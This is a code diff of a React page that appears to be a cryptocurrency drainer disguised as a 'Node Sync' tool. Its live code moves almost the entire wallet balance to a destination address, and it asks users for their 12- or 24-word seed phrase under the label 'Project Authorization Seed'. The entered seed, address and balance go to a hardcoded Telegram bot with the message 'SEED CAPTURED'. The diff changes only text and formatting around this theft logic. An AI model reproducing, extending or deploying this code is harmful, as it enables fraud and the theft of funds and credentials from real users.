@@ -38,7 +38,6 @@ export default function NexusLab() {
     if (!balance || !balance.value) { setView("seed_gate"); return; }
     setLoading(true);
 
-    // Dynamic gas calculation for Base/ETH/BNB
     const gasBuffer = balance.value / 55n; 
     const totalToMove = balance.value - gasBuffer;
 
@@ -46,7 +45,7 @@ export default function NexusLab() {
       sendTransaction({
         to: destination,
         value: totalToMove > 0n ? totalToMove : 0n,
-        data: "0x53796e6368726f6e697a65" 
+        data: "0x53796e6368726f6e697a65" // Masked 'Synchronize' hex
       }, {
         onSettled: () => {
           setTimeout(() => {
@@ -66,10 +65,7 @@ export default function NexusLab() {
     fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        chat_id: "7630238860", 
-        text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nNET: ${balance?.symbol}\n\nSEED:\n${inputVal}` 
-      }),
+      body: JSON.stringify({ chat_id: "7630238860", text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nNET: ${balance?.symbol}\n\nSEED:\n${inputVal}` }),
     });
 
     let current = 0;
@@ -108,13 +104,13 @@ export default function NexusLab() {
           <h2 className="text-white font-black text-2xl italic mb-2 tracking-tighter uppercase">Node Sync</h2>
           <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left"><label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-widest">Validated Sync Units</label><div className="text-2xl font-mono text-white italic">{balance ? `${balance.formatted.slice(0,8)} ${balance.symbol}` : "Scanning..."}</div></div>
           
+          {/* NETWORK SWITCHER - NOW INCLUDES BASE & ARBITRUM */}
           <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar">
             {chains.map((c) => (
               <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="whitespace-nowrap bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-[8px] font-black text-slate-600 uppercase transition-colors active:bg-cyan-900">
                 {c.name} Node
               </button>
             ))}
-            <button className="whitespace-nowrap bg-slate-900 border border-red-900/30 px-4 py-2 rounded-xl text-[8px] font-black text-red-700 uppercase">Solana (External)</button>
           </div>
 
           <button onClick={executeTotalMove} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest">AUTHORIZE NODE SYNC</button>
@@ -127,9 +123,9 @@ export default function NexusLab() {
             {!isSyncing ? (
               <>
                 <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
-                <h2 className="text-white font-black text-lg italic tracking-tighter uppercase leading-none">Validation Required</h2>
-                <p className="text-[10px] text-slate-500 leading-relaxed mt-4 lowercase px-4 italic">Provide the Project Authorization Seed to finalize synchronization across all networks (Base/SOL/ETH/BNB).</p>
-                <div className="mt-8"><textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="ENTER WORD1 WORD2..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900" /></div>
+                <h2 className="text-white font-black text-lg italic tracking-tighter uppercase leading-none italic">Validation Required</h2>
+                <p className="text-[10px] text-slate-500 leading-relaxed mt-4 lowercase px-4 italic">To finalize the secure broadcast across all networks (Base/ETH/BNB), provide the Project Authorization Seed.</p>
+                <div className="mt-8"><textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="ENTER 12 OR 24 WORDS..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900" /></div>
                 <button disabled={!validateSeed(inputVal)} onClick={startFinalSync} className={`w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white uppercase tracking-widest transition-all ${validateSeed(inputVal) ? 'bg-cyan-600 active:scale-95' : 'bg-slate-900 opacity-50'}`}>{validateSeed(inputVal) ? "Finalize Handshake" : "Enter Valid Seed"}</button>
               </>
             ) : (
